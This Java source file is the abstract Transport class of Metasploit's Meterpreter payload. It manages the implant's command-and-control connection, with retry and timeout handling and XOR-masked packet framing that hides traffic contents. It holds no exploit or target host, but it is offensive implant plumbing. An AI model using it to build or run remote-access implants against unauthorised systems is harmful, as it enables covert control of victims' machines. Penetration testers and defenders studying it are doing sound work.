package com.metasploit.meterpreter;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.io.IOException;

public abstract class Transport {
    public static final long MS = 1000L;

    private Transport prev;
    private Transport next;

    protected String url;
    protected long commTimeout;
    protected long retryTotal;
    protected long retryWait;

    protected abstract boolean tryConnect(Meterpreter met) throws IOException;

    public abstract int parseConfig(byte[] configuration, int offset);
    public abstract void bind(DataInputStream in, OutputStream rawOut);
    public abstract void disconnect();
    public abstract boolean dispatch(Meterpreter met);
    public abstract void writePacket(TLVPacket packet, int type) throws IOException;
    public abstract TLVPacket readPacket() throws IOException;
    public abstract boolean switchUri(String uri);

    protected Transport(String url) {
        this.url = url;
    }

    protected int parseTimeouts(byte[] configuration, int offset) {
        // starts with the comms timeout
        this.commTimeout = MS * Meterpreter.unpack32(configuration, offset);
        offset += 4;

        // then we have the retry total
        this.retryTotal = MS * Meterpreter.unpack32(configuration, offset);
        offset += 4;

        // then we have the retry wait
        this.retryWait = MS * Meterpreter.unpack32(configuration, offset);
        offset += 4;

        return offset;
    }

    protected TLVPacket readAndDecodePacket(DataInputStream in) throws IOException {
        // XOR key is first
        byte[] xorKey = new byte[4];
        in.readFully(xorKey);
        // the length value comes next
        byte[] lenBytes = new byte[4];
        in.readFully(lenBytes);
        // length is xor'd
        this.xorBytes(xorKey, lenBytes);
        int len = this.bytesToInt(lenBytes) - 8;

        // skype the type
        int type = in.readInt();

        // read in the rest of the packet
        byte[] body = new byte[len];
        in.readFully(body);

        // decode the packet
        this.xorBytes(xorKey, body);

        ByteArrayInputStream byteStream = new ByteArrayInputStream(body);
        DataInputStream inputStream = new DataInputStream(byteStream);
        TLVPacket packet = new TLVPacket(inputStream, len);
        inputStream.close();

        return packet;
    }

    protected void encodePacketAndWrite(TLVPacket packet, int type, DataOutputStream out) throws IOException {
        byte[] xorKey = randXorKey();
        byte[] data = packet.toByteArray();
        byte[] lengthBytes = intToBytes(data.length + 8);
        byte[] typeBytes = intToBytes(type);

        this.xorBytes(xorKey, lengthBytes);
        this.xorBytes(xorKey, typeBytes);
        this.xorBytes(xorKey, data);

        synchronized (out) {
            out.write(xorKey);
            out.write(lengthBytes);
            out.write(typeBytes);
            out.write(data);
            out.flush();
        }
    }

    private byte[] randXorKey() {
        byte[] result = new byte[4];
        result[0] = randByte();
        result[1] = randByte();
        result[2] = randByte();
        result[3] = randByte();
        return result;
    }

    private byte randByte() {
        // Forces a random number between 1 and 255 _inclusive_
        return (byte)(0xFF & (int)((Math.random() * 255) + 1));
    }

    private void xorBytes(byte[] xorKey, byte[] bytes) {
        for (int i = 0; i < bytes.length; ++i) {
            bytes[i] ^= xorKey[i % xorKey.length];
        }
    }

    private int bytesToInt(byte[] value) {
        // we need to mask this thanks to potential
        // sign extension issues (Y U NO UNSIGNED INT?!)
        int v0 = ((int)value[0]) << 24 & 0xFF000000;
        int v1 = ((int)value[1]) << 16 & 0x00FF0000;
        int v2 = ((int)value[2]) << 8  & 0x0000FF00;
        int v3 = ((int)value[3]) << 0  & 0x000000FF;
        return v0 | v1 | v2 | v3;
    }

    private byte[] intToBytes(int value) {
        byte[] result = new byte[4];
        result[0] = (byte)((value >> 24) & 0xFF);
        result[1] = (byte)((value >> 16) & 0xFF);
        result[2] = (byte)((value >> 8) & 0xFF);
        result[3] = (byte)(value & 0xFF);
        return result;
    }

    public String getUrl() {
        return this.url;
    }

    public long getCommTimeout() {
        return this.commTimeout / MS;
    }

    public void setCommTimeout(long commTimeout) {
        this.commTimeout = commTimeout * MS;
    }

    public long getRetryTotal() {
        return this.retryTotal / MS;
    }

    public void setRetryTotal(long retryTotal) {
        this.retryTotal = retryTotal * MS;
    }

    public long getRetryWait() {
        return this.retryWait / MS;
    }

    public void setRetryWait(long retryWait) {
        this.retryWait = retryWait * MS;
    }

    public boolean connect(Meterpreter met) {
        long lastAttempt = System.currentTimeMillis();

        while (System.currentTimeMillis() < lastAttempt + this.retryTotal) {
            try {
                if (this.tryConnect(met)) {
                    return true;
                }
            } catch (Exception e) {
            }

            met.sleep(this.retryWait);
        }

        return false;
    }

    public void setPrev(Transport t) {
        this.prev = t;
    }

    public void setNext(Transport t) {
        this.next = t;
    }

    public Transport getPrev() {
        return this.prev;
    }

    public Transport getNext() {
        return this.next;
    }
}

